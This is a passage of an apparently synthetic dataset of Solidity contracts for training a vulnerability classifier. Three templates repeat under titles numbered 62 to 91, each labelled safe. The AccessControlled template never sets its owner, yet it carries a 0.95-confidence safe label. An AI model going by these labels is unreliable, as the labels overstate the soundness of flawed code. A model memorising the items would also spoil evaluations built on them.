    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 62",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 63",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 64",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 65",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 66",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 67",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 68",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 69",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 70",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 71",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 72",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 73",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 74",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 75",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 76",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 77",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 78",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 79",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 80",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 81",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 82",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 83",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 84",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 85",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 86",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 87",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 88",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 89",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 90",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 91",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
